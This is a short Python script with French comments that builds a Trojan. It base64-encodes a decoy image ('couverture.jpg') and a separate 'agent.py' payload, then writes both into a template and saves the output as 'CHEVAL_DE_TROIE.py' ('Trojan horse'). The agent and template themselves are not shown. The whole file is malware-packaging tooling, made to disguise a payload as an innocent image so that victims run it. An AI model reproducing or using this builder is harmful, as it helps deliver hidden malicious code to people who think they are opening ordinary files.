import base64

with open("couverture.jpg", "rb") as img:
    img_enc = base64.b64encode(img.read())

with open("agent.py", "rb") as agt:
    agt_enc = base64.b64encode(agt.read())

with open("final_package.py", "r") as f:
    template = f.read()

# Remplacement des placeholders par les données réelles
final_code = template.replace('b"IMAGE_BINARY_PLACEHOLDER"', f'b"{img_enc.decode()}"')
final_code = final_code.replace('b"AGENT_CODE_PLACEHOLDER"', f'b"{agt_enc.decode()}"')

with open("CHEVAL_DE_TROIE.py", "w") as f:
    f.write(final_code)

print("[+] CHEVAL_DE_TROIE.py a été généré avec succès.")
